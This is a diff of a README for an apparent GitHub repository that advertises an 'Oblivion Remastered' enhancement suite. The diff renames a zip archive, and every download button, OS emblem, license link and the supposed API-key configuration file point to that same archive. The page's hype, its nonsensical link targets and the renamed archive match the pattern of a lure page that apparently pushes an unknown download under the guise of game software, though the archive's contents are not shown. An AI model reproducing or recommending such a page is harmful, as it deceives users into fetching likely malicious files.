@@ -1,13 +1,13 @@
 # The Elder Scrolls IV: Oblivion Remastered - The Ultimate Nostalgia Journey
 
-[![Download](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/remastered-hub-essentials-oblivion-v1.0.zip)](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/remastered-hub-essentials-oblivion-v1.0.zip)
+[![Download](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/oblivion-essentials-hub-remastered-duumvirate.zip)](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/oblivion-essentials-hub-remastered-duumvirate.zip)
 
 Are you ready to relive the magic of Tamriel with groundbreaking visual upgrades, modernized features, and robust enhancements? **The Elder Scrolls IV: Oblivion Remastered** revamps one of the most celebrated open-world adventure RPGs, now transcending generations with smart technologies, dynamic support, and a global community behind every sword swing and spoken prophecy.
 
 ## 🚦 Quick Access
 
 **Download the Ultimate Remastered Package:**
-[![Download](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/remastered-hub-essentials-oblivion-v1.0.zip)](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/remastered-hub-essentials-oblivion-v1.0.zip)
+[![Download](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/oblivion-essentials-hub-remastered-duumvirate.zip)](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/oblivion-essentials-hub-remastered-duumvirate.zip)
 
 ---
 
@@ -18,9 +18,9 @@ This journey is as versatile as a Khajiit's acrobatics.
 
 | Operating System   | Compatibility | Emblem |
 |--------------------|:-------------:|:------:|
-| Windows 10/11      | ✅            | ![Windows](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/remastered-hub-essentials-oblivion-v1.0.zip) |
-| macOS (Monterey+)  | ✅            | ![macOS](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/remastered-hub-essentials-oblivion-v1.0.zip)  |
-| Linux (Ubuntu 22+) | ✅            | ![Linux](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/remastered-hub-essentials-oblivion-v1.0.zip) |
+| Windows 10/11      | ✅            | ![Windows](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/oblivion-essentials-hub-remastered-duumvirate.zip) |
+| macOS (Monterey+)  | ✅            | ![macOS](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/oblivion-essentials-hub-remastered-duumvirate.zip)  |
+| Linux (Ubuntu 22+) | ✅            | ![Linux](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/oblivion-essentials-hub-remastered-duumvirate.zip) |
 
 ---
 
@@ -52,7 +52,7 @@ This remastering toolkit includes ready-made endpoints for OpenAI and Claude API
 - **Smart Quest Guidance** – Interact directly with LLMs for quest hints and lore explanations.
 - **Lore Genie** – Ask about any character or artifact from Tamriel and receive deep-dive AI insights.
 
-API keys can be configured in the `https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/remastered-hub-essentials-oblivion-v1.0.zip` file.  
+API keys can be configured in the `https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/oblivion-essentials-hub-remastered-duumvirate.zip` file.  
 Supports GPT-4, Claude 3, and more!
 
 ---
@@ -78,7 +78,7 @@ Use at your own risk; echoing guards’ wisdom, “Stop right there, criminal sc
 ## 📜 MIT License (2025)
 
 This repository is distributed under the MIT License, ensuring that every tool, enhancement, and script is yours to use, modify, and share.  
-Review the full license text [here](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/remastered-hub-essentials-oblivion-v1.0.zip) before embarking on your journey.
+Review the full license text [here](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/oblivion-essentials-hub-remastered-duumvirate.zip) before embarking on your journey.
 
 ---
 
@@ -87,6 +87,6 @@ Review the full license text [here](https://github.com/kristopher-pn/oblivion-re
 Ready to step through the gates of Oblivion once more?  
 Forge your adventure by downloading the enhancement suite below:
 
-[![Download](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/remastered-hub-essentials-oblivion-v1.0.zip)](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/remastered-hub-essentials-oblivion-v1.0.zip)
+[![Download](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/oblivion-essentials-hub-remastered-duumvirate.zip)](https://github.com/kristopher-pn/oblivion-remastered-essentials-hub/raw/refs/heads/main/spissitude/oblivion-essentials-hub-remastered-duumvirate.zip)
 
 **May Sheogorath’s wisdom (and a fast SSD) be with you!**
